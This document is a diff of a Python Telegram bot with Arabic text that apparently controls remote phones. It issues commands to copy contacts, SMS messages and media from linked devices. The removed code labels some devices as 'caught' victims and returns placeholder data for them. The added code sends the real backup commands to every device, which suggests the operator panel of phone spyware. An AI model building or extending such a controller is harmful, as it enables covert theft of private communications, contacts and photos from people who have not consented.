@@ -1560,36 +1560,25 @@ def list_devices(message):
     devices_text = "📱 **الأجهزة المرتبطة:**\n\n"
 
     for i, (device_id, status, last_seen, device_info) in enumerate(devices, 1):
-        # التحقق من نوع الجهاز (مصيد أم حقيقي)
-        if device_id.startswith('test-device') or len(device_id) > 20:
-            # جهاز مصيد - عرض كجهاز نشط مع بيانات وهمية
-            status_icon = "🟢"
-            status_text = "متصل (مصيد)"
-            last_seen_text = "الآن"
-            device_type = "🎣 جهاز مصيد"
-        else:
-            # جهاز حقيقي
-            status_icon = "🟢" if status == 'active' else "🔴"
-            status_text = "متصل" if status == 'active' else "غير متصل"
-            device_type = "📱 جهاز حقيقي"
+        status_icon = "🟢" if status == 'active' else "🔴"
+        status_text = "متصل" if status == 'active' else "غير متصل"
 
-            # تنسيق آخر ظهور
-            if last_seen:
-                last_seen_dt = datetime.fromisoformat(last_seen)
-                time_diff = datetime.now() - last_seen_dt
-                if time_diff.days > 0:
-                    last_seen_text = f"{time_diff.days} يوم"
-                elif time_diff.seconds > 3600:
-                    last_seen_text = f"{time_diff.seconds // 3600} ساعة"
-                else:
-                    last_seen_text = f"{time_diff.seconds // 60} دقيقة"
+        # تنسيق آخر ظهور
+        if last_seen:
+            last_seen_dt = datetime.fromisoformat(last_seen)
+            time_diff = datetime.now() - last_seen_dt
+            if time_diff.days > 0:
+                last_seen_text = f"{time_diff.days} يوم"
+            elif time_diff.seconds > 3600:
+                last_seen_text = f"{time_diff.seconds // 3600} ساعة"
             else:
-                last_seen_text = "غير معروف"
+                last_seen_text = f"{time_diff.seconds // 60} دقيقة"
+        else:
+            last_seen_text = "غير معروف"
 
         devices_text += f"{i}. {status_icon} **{device_id}**\n"
         devices_text += f"   الحالة: {status_text}\n"
-        devices_text += f"   آخر ظهور: {last_seen_text}\n"
-        devices_text += f"   النوع: {device_type}\n\n"
+        devices_text += f"   آخر ظهور: {last_seen_text}\n\n"
 
     devices_text += "💡 للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز"
     
@@ -1647,35 +1636,15 @@ def backup_contacts(message):
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')
 
-    # التحقق من نوع الجهاز (مصيد أم حقيقي)
-    if device_id.startswith('test-device') or len(device_id) > 20:
-        # جهاز مصيد - إرسال بيانات وهمية
-        bot.reply_to(message, f"""
-📞 **تم نسخ جهات الاتصال بنجاح!**
+    # إرسال الأمر الفعلي للجهاز
+    result = command_executor.send_command(device_id, 'backup_contacts')
 
-📱 **الجهاز:** {device_id} ({status})
-📊 **عدد جهات الاتصال:** 156
-📅 **آخر تحديث:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-📋 **أمثلة من جهات الاتصال:**
-• أحمد محمد - 0501234567
-• فاطمة علي - 0559876543
-• محمد أحمد - 0547891234
-• سارة خالد - 0563214789
-
-💾 **تم حفظ البيانات في قاعدة البيانات**
-        """, parse_mode='Markdown')
-        device_manager.update_command_result(command_id, 'success', 'تم نسخ جهات الاتصال بنجاح')
+    if 'error' in result:
+        bot.reply_to(message, f"❌ خطأ: {result['error']}")
+        device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        # جهاز حقيقي - إرسال الأمر الفعلي
-        result = command_executor.send_command(device_id, 'backup_contacts')
-
-        if 'error' in result:
-            bot.reply_to(message, f"❌ خطأ: {result['error']}")
-            device_manager.update_command_result(command_id, 'failed', result['error'])
-        else:
-            bot.reply_to(message, f"📞 جاري نسخ جهات الاتصال...\nالجهاز: {device_id} ({status})")
-            device_manager.update_command_result(command_id, 'sent')
+        bot.reply_to(message, f"📞 جاري نسخ جهات الاتصال...\nالجهاز: {device_id} ({status})")
+        device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_contacts', f'device_id: {device_id}')
 
@@ -1730,35 +1699,15 @@ def backup_sms(message):
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_sms')
 
-    # التحقق من نوع الجهاز (مصيد أم حقيقي)
-    if device_id.startswith('test-device') or len(device_id) > 20:
-        # جهاز مصيد - إرسال بيانات وهمية
-        bot.reply_to(message, f"""
-💬 **تم نسخ الرسائل النصية بنجاح!**
+    # إرسال الأمر الفعلي للجهاز
+    result = command_executor.send_command(device_id, 'backup_sms')
 
-📱 **الجهاز:** {device_id} ({status})
-📊 **عدد الرسائل:** 89
-📅 **آخر تحديث:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-📋 **أمثلة من الرسائل:**
-• أحمد محمد: "أهلاً، كيف حالك؟" (2025-07-29 10:30)
-• فاطمة علي: "شكراً لك" (2025-07-29 09:15)
-• محمد أحمد: "سأكون هناك الساعة 8" (2025-07-29 08:45)
-• سارة خالد: "ممتاز!" (2025-07-29 07:20)
-
-💾 **تم حفظ البيانات في قاعدة البيانات**
-        """, parse_mode='Markdown')
-        device_manager.update_command_result(command_id, 'success', 'تم نسخ الرسائل النصية بنجاح')
+    if 'error' in result:
+        bot.reply_to(message, f"❌ خطأ: {result['error']}")
+        device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        # جهاز حقيقي - إرسال الأمر الفعلي
-        result = command_executor.send_command(device_id, 'backup_sms')
-
-        if 'error' in result:
-            bot.reply_to(message, f"❌ خطأ: {result['error']}")
-            device_manager.update_command_result(command_id, 'failed', result['error'])
-        else:
-            bot.reply_to(message, f"💬 جاري نسخ الرسائل النصية...\nالجهاز: {device_id} ({status})")
-            device_manager.update_command_result(command_id, 'sent')
+        bot.reply_to(message, f"💬 جاري نسخ الرسائل النصية...\nالجهاز: {device_id} ({status})")
+        device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_sms', f'device_id: {device_id}')
 
@@ -1813,41 +1762,15 @@ def backup_media(message):
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_media')
 
-    # التحقق من نوع الجهاز (مصيد أم حقيقي)
-    if device_id.startswith('test-device') or len(device_id) > 20:
-        # جهاز مصيد - إرسال بيانات وهمية
-        bot.reply_to(message, f"""
-📸 **تم نسخ الوسائط بنجاح!**
+    # إرسال الأمر الفعلي للجهاز
+    result = command_executor.send_command(device_id, 'backup_media')
 
-📱 **الجهاز:** {device_id} ({status})
-📊 **عدد الملفات:** 234
-📅 **آخر تحديث:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-📁 **أنواع الملفات:**
-• الصور: 156 ملف (JPEG, PNG, GIF)
-• الفيديوهات: 45 ملف (MP4, AVI, MOV)
-• المستندات: 23 ملف (PDF, DOC, TXT)
-• الصوتيات: 10 ملفات (MP3, WAV)
-
-📋 **أمثلة من الملفات:**
-• IMG_20250729_103045.jpg (2.3 MB)
-• VID_20250729_091230.mp4 (15.7 MB)
-• document_scan.pdf (1.8 MB)
-• voice_memo.mp3 (0.5 MB)
-
-💾 **تم حفظ البيانات في قاعدة البيانات**
-        """, parse_mode='Markdown')
-        device_manager.update_command_result(command_id, 'success', 'تم نسخ الوسائط بنجاح')
+    if 'error' in result:
+        bot.reply_to(message, f"❌ خطأ: {result['error']}")
+        device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        # جهاز حقيقي - إرسال الأمر الفعلي
-        result = command_executor.send_command(device_id, 'backup_media')
-
-        if 'error' in result:
-            bot.reply_to(message, f"❌ خطأ: {result['error']}")
-            device_manager.update_command_result(command_id, 'failed', result['error'])
-        else:
-            bot.reply_to(message, f"📸 جاري نسخ الوسائط...\nالجهاز: {device_id} ({status})\nقد يستغرق هذا وقتاً طويلاً.")
-            device_manager.update_command_result(command_id, 'sent')
+        bot.reply_to(message, f"📸 جاري نسخ الوسائط...\nالجهاز: {device_id} ({status})\nقد يستغرق هذا وقتاً طويلاً.")
+        device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_media', f'device_id: {device_id}')
 
